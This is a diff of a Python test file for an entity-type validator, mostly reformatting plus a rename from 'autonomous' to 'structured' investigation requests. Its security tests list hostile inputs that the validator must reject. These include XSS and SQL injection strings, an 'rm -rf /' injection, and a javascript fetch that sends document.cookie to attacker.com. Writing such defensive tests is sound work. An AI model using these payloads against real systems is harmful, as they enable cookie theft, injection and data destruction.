@@ -7,14 +7,16 @@ import pytest
 from pydantic import ValidationError
 
 from app.models.validation import ValidatedEntityType, ValidatedInvestigationRequest
-from app.router.models.autonomous_investigation_models import AutonomousInvestigationRequest
+from app.router.models.structured_investigation_models import (
+    StructuredInvestigationRequest,
+)
 from app.utils.entity_validation import (
+    create_entity_type_error_response,
     get_all_entity_types,
     get_entity_type_categories,
-    validate_entity_type_format,
-    validate_entity_type_against_enum,
     get_entity_type_suggestions,
-    create_entity_type_error_response
+    validate_entity_type_against_enum,
+    validate_entity_type_format,
 )
 
 
@@ -37,12 +39,12 @@ class TestEntityTypeValidationUtils:
         assert "core" in categories
         assert "behavioral" in categories
         assert "risk" in categories
-        
+
         # Check core types
         core_types = categories["core"]
         assert "user" in core_types
         assert "device" in core_types
-        
+
         # Check behavioral types
         behavioral_types = categories["behavioral"]
         assert "login_pattern" in behavioral_types
@@ -50,7 +52,7 @@ class TestEntityTypeValidationUtils:
     def test_validate_entity_type_format_valid(self):
         """Test format validation with valid inputs"""
         valid_inputs = ["user", "device", "transaction", "EMAIL"]
-        
+
         for input_type in valid_inputs:
             is_valid, error = validate_entity_type_format(input_type)
             assert is_valid is True
@@ -67,7 +69,7 @@ class TestEntityTypeValidationUtils:
             ("user; DROP TABLE users;", "Invalid characters detected in entity type"),
             ("javascript:alert(1)", "Invalid characters detected in entity type"),
         ]
-        
+
         for input_type, expected_error in invalid_inputs:
             is_valid, error = validate_entity_type_format(input_type)
             assert is_valid is False
@@ -76,7 +78,7 @@ class TestEntityTypeValidationUtils:
     def test_validate_entity_type_against_enum_valid(self):
         """Test enum validation with valid entity types"""
         valid_types = ["user", "device", "transaction", "account", "network"]
-        
+
         for entity_type in valid_types:
             is_valid, error = validate_entity_type_against_enum(entity_type)
             assert is_valid is True
@@ -85,7 +87,7 @@ class TestEntityTypeValidationUtils:
     def test_validate_entity_type_against_enum_invalid(self):
         """Test enum validation with invalid entity types"""
         invalid_types = ["invalid_type", "fake_entity", "nonexistent"]
-        
+
         for entity_type in invalid_types:
             is_valid, error = validate_entity_type_against_enum(entity_type)
             assert is_valid is False
@@ -98,12 +100,12 @@ class TestEntityTypeValidationUtils:
         suggestions = get_entity_type_suggestions("use")
         assert isinstance(suggestions, list)
         assert "user" in suggestions
-        
+
         # Test category match
         suggestions = get_entity_type_suggestions("pattern")
         assert isinstance(suggestions, list)
         assert any("pattern" in s for s in suggestions)
-        
+
         # Test no match fallback
         suggestions = get_entity_type_suggestions("xyz123")
         assert isinstance(suggestions, list)
@@ -112,7 +114,7 @@ class TestEntityTypeValidationUtils:
     def test_create_entity_type_error_response(self):
         """Test error response creation"""
         error_response = create_entity_type_error_response("invalid_type")
-        
+
         assert isinstance(error_response, dict)
         assert error_response["error"] == "Invalid entity type"
         assert error_response["provided_type"] == "invalid_type"
@@ -128,8 +130,15 @@ class TestValidatedEntityType:
 
     def test_valid_entity_types(self):
         """Test with valid entity types"""
-        valid_types = ["user", "device", "transaction", "account", "network", "location"]
-        
+        valid_types = [
+            "user",
+            "device",
+            "transaction",
+            "account",
+            "network",
+            "location",
+        ]
+
         for entity_type in valid_types:
             validated = ValidatedEntityType(entity_type=entity_type)
             assert validated.entity_type == entity_type.lower()
@@ -140,9 +149,9 @@ class TestValidatedEntityType:
             ("USER", "user"),
             ("Device", "device"),
             ("TRANSACTION", "transaction"),
-            ("Account", "account")
+            ("Account", "account"),
         ]
-        
+
         for input_type, expected in test_cases:
             validated = ValidatedEntityType(entity_type=input_type)
             assert validated.entity_type == expected
@@ -152,26 +161,21 @@ class TestValidatedEntityType:
         test_cases = [
             ("  user  ", "user"),
             ("\tdevice\t", "device"),
-            ("\nTransaction\n", "transaction")
+            ("\nTransaction\n", "transaction"),
         ]
-        
+
         for input_type, expected in test_cases:
             validated = ValidatedEntityType(entity_type=input_type)
             assert validated.entity_type == expected
 
     def test_invalid_entity_types(self):
         """Test with invalid entity types"""
-        invalid_types = [
-            "invalid_type",
-            "fake_entity",
-            "nonexistent_type",
-            "user_fake"
-        ]
-        
+        invalid_types = ["invalid_type", "fake_entity", "nonexistent_type", "user_fake"]
+
         for entity_type in invalid_types:
             with pytest.raises(ValidationError) as exc_info:
                 ValidatedEntityType(entity_type=entity_type)
-            
+
             error = str(exc_info.value)
             assert "Invalid entity type" in error
 
@@ -185,13 +189,13 @@ class TestValidatedEntityType:
             "<iframe src='evil.com'></iframe>",
             "vbscript:msgbox(1)",
             "user--comment",
-            "device;malicious_command"
+            "device;malicious_command",
         ]
-        
+
         for malicious_input in malicious_inputs:
             with pytest.raises(ValidationError) as exc_info:
                 ValidatedEntityType(entity_type=malicious_input)
-            
+
             error = str(exc_info.value)
             assert "Invalid characters detected" in error
 
@@ -199,10 +203,10 @@ class TestValidatedEntityType:
         """Test empty and None values"""
         with pytest.raises(ValidationError):
             ValidatedEntityType(entity_type="")
-        
+
         with pytest.raises(ValidationError):
             ValidatedEntityType(entity_type="   ")
-        
+
         with pytest.raises(ValidationError):
             ValidatedEntityType()
 
@@ -212,9 +216,12 @@ class TestValidatedEntityType:
         long_string = "a" * 101
         with pytest.raises(ValidationError) as exc_info:
             ValidatedEntityType(entity_type=long_string)
-        
+
         error = str(exc_info.value)
-        assert ("should have at most 100 characters" in error or "exceeds maximum length" in error)
+        assert (
+            "should have at most 100 characters" in error
+            or "exceeds maximum length" in error
+        )
 
 
 class TestValidatedInvestigationRequest:
@@ -225,10 +232,10 @@ class TestValidatedInvestigationRequest:
         request = ValidatedInvestigationRequest(
             entity_id="test123",
             entity_type="user",
-            investigation_id="inv123", 
-            time_range="30d"
+            investigation_id="inv123",
+            time_range="30d",
         )
-        
+
         assert request.entity_id == "test123"
         assert request.entity_type == "user"
         assert request.investigation_id == "inv123"
@@ -242,10 +249,10 @@ class TestValidatedInvestigationRequest:
             entity_type="device",
             investigation_id="inv456",
             time_range="7d",
-            mode="autonomous"
+            mode="structured",
         )
-        
-        assert request.mode == "autonomous"
+
+        assert request.mode == "structured"
 
     def test_invalid_entity_type_in_request(self):
         """Test invalid entity type in investigation request"""
@@ -254,53 +261,51 @@ class TestValidatedInvestigationRequest:
                 entity_id="test123",
                 entity_type="invalid_type",
                 investigation_id="inv123",
-                time_range="30d"
+                time_range="30d",
             )
-        
+
         error = str(exc_info.value)
         assert "Invalid entity type" in error
 
 
-class TestAutonomousInvestigationRequest:
-    """Test AutonomousInvestigationRequest model validation"""
+class TestStructuredInvestigationRequest:
+    """Test StructuredInvestigationRequest model validation"""
 
-    def test_valid_autonomous_request(self):
-        """Test valid autonomous investigation request"""
-        request = AutonomousInvestigationRequest(
-            entity_id="test789",
-            entity_type="transaction"
+    def test_valid_structured_request(self):
+        """Test valid structured investigation request"""
+        request = StructuredInvestigationRequest(
+            entity_id="test789", entity_type="transaction"
         )
-        
+
         assert request.entity_id == "test789"
         assert request.entity_type == "transaction"
         assert request.enable_verbose_logging is True  # default
         assert request.enable_journey_tracking is True  # default
         assert request.investigation_priority == "normal"  # default
 
-    def test_autonomous_request_with_options(self):
-        """Test autonomous request with custom options"""
-        request = AutonomousInvestigationRequest(
+    def test_structured_request_with_options(self):
+        """Test structured request with custom options"""
+        request = StructuredInvestigationRequest(
             entity_id="test999",
             entity_type="account",
             investigation_id="custom_inv",
             enable_verbose_logging=False,
             investigation_priority="high",
-            metadata={"custom": "data"}
+            metadata={"custom": "data"},
         )
-        
+
         assert request.investigation_id == "custom_inv"
         assert request.enable_verbose_logging is False
         assert request.investigation_priority == "high"
         assert request.metadata == {"custom": "data"}
 
-    def test_invalid_entity_type_autonomous(self):
-        """Test invalid entity type in autonomous request"""
+    def test_invalid_entity_type_structured(self):
+        """Test invalid entity type in structured request"""
         with pytest.raises(ValidationError) as exc_info:
-            AutonomousInvestigationRequest(
-                entity_id="test123",
-                entity_type="invalid_entity"
+            StructuredInvestigationRequest(
+                entity_id="test123", entity_type="invalid_entity"
             )
-        
+
         error = str(exc_info.value)
         assert "Invalid entity type" in error
 
@@ -308,23 +313,32 @@ class TestAutonomousInvestigationRequest:
 class TestSecurityValidation:
     """Comprehensive security validation tests"""
 
-    @pytest.mark.parametrize("malicious_input,expected_error", [
-        ("<script>alert('xss')</script>", "Invalid characters detected"),
-        ("javascript:alert(document.cookie)", "Invalid characters detected"),
-        ("user'; DROP TABLE investigations; --", "Invalid characters detected"),
-        ("device\" UNION SELECT password FROM users --", "Invalid characters detected"),
-        ("<iframe src=\"javascript:alert('xss')\"></iframe>", "Invalid characters detected"),
-        ("vbscript:CreateObject(\"WScript.Shell\")", "Invalid characters detected"),
-        ("data:text/html,<script>alert(1)</script>", "Invalid characters detected"),
-        ("user/**/UNION/**/SELECT", "Invalid characters detected"),
-        ("device;exec('rm -rf /')", "Invalid characters detected"),
-        ("account--admin_backdoor", "Invalid characters detected")
-    ])
+    @pytest.mark.parametrize(
+        "malicious_input,expected_error",
+        [
+            ("<script>alert('xss')</script>", "Invalid characters detected"),
+            ("javascript:alert(document.cookie)", "Invalid characters detected"),
+            ("user'; DROP TABLE investigations; --", "Invalid characters detected"),
+            (
+                'device" UNION SELECT password FROM users --',
+                "Invalid characters detected",
+            ),
+            (
+                "<iframe src=\"javascript:alert('xss')\"></iframe>",
+                "Invalid characters detected",
+            ),
+            ('vbscript:CreateObject("WScript.Shell")', "Invalid characters detected"),
+            ("data:text/html,<script>alert(1)</script>", "Invalid characters detected"),
+            ("user/**/UNION/**/SELECT", "Invalid characters detected"),
+            ("device;exec('rm -rf /')", "Invalid characters detected"),
+            ("account--admin_backdoor", "Invalid characters detected"),
+        ],
+    )
     def test_comprehensive_security_validation(self, malicious_input, expected_error):
         """Test comprehensive security validation against various attack vectors"""
         with pytest.raises(ValidationError) as exc_info:
             ValidatedEntityType(entity_type=malicious_input)
-        
+
         error = str(exc_info.value)
         assert expected_error in error
 
@@ -336,13 +350,13 @@ class TestSecurityValidation:
             "account UNION SELECT * FROM sensitive_data",
             "transaction' INSERT INTO logs VALUES('hacked')",
             "location' UPDATE admin SET password='pwned'",
-            "network' DELETE FROM investigations WHERE id > 0"
+            "network' DELETE FROM investigations WHERE id > 0",
         ]
-        
+
         for pattern in sql_injection_patterns:
             with pytest.raises(ValidationError) as exc_info:
                 ValidatedEntityType(entity_type=pattern)
-            
+
             error = str(exc_info.value)
             assert "Invalid characters detected" in error
 
@@ -353,14 +367,14 @@ class TestSecurityValidation:
             "javascript:fetch('http://attacker.com/steal?data='+document.cookie)",
             "<img src='x' onerror='alert(1)'>",
             "<div onmouseover='alert(\"XSS\")'>hover me</div>",
-            "vbscript:msgbox(\"Infected\")",
-            "<iframe src='data:text/html,<script>location.href=\"http://evil.com\"</script>'>"
+            'vbscript:msgbox("Infected")',
+            "<iframe src='data:text/html,<script>location.href=\"http://evil.com\"</script>'>",
         ]
-        
+
         for pattern in script_patterns:
             with pytest.raises(ValidationError) as exc_info:
                 ValidatedEntityType(entity_type=pattern)
-            
+
             error = str(exc_info.value)
             assert "Invalid characters detected" in error
 
@@ -371,7 +385,7 @@ class TestPerformanceAndEdgeCases:
     def test_all_valid_entity_types(self):
         """Test all valid entity types from the enum"""
         all_types = get_all_entity_types()
-        
+
         # Test each valid type
         for entity_type in all_types[:10]:  # Test first 10 to avoid excessive test time
             validated = ValidatedEntityType(entity_type=entity_type)
@@ -385,9 +399,9 @@ class TestPerformanceAndEdgeCases:
             "пользователь",  # Cyrillic
             "user🔒",  # emoji
             "device\x00null",  # null byte
-            "account\r\ninjection"  # CRLF injection
+            "account\r\ninjection",  # CRLF injection
         ]
-        
+
         for unicode_input in unicode_inputs:
             with pytest.raises(ValidationError):
                 ValidatedEntityType(entity_type=unicode_input)
@@ -396,33 +410,31 @@ class TestPerformanceAndEdgeCases:
         """Test boundary conditions"""
         # Test exactly at limit
         max_length_string = "a" * 100
-        with pytest.raises(ValidationError):  # Should fail because it's not a valid enum value
+        with pytest.raises(
+            ValidationError
+        ):  # Should fail because it's not a valid enum value
             ValidatedEntityType(entity_type=max_length_string)
-        
+
         # Test just over limit
         over_limit_string = "a" * 101
         with pytest.raises(ValidationError) as exc_info:
             ValidatedEntityType(entity_type=over_limit_string)
-        
+
         error = str(exc_info.value)
-        assert ("should have at most 100 characters" in error or "exceeds maximum length" in error)
+        assert (
+            "should have at most 100 characters" in error
+            or "exceeds maximum length" in error
+        )
 
     def test_normalization_consistency(self):
         """Test that normalization is consistent"""
-        variations = [
-            "USER",
-            "User", 
-            "user",
-            "  USER  ",
-            "\tuser\t",
-            "\nUSER\n"
-        ]
-        
+        variations = ["USER", "User", "user", "  USER  ", "\tuser\t", "\nUSER\n"]
+
         results = []
         for variation in variations:
             validated = ValidatedEntityType(entity_type=variation)
             results.append(validated.entity_type)
-        
+
         # All should normalize to the same value
         assert all(result == "user" for result in results)
 
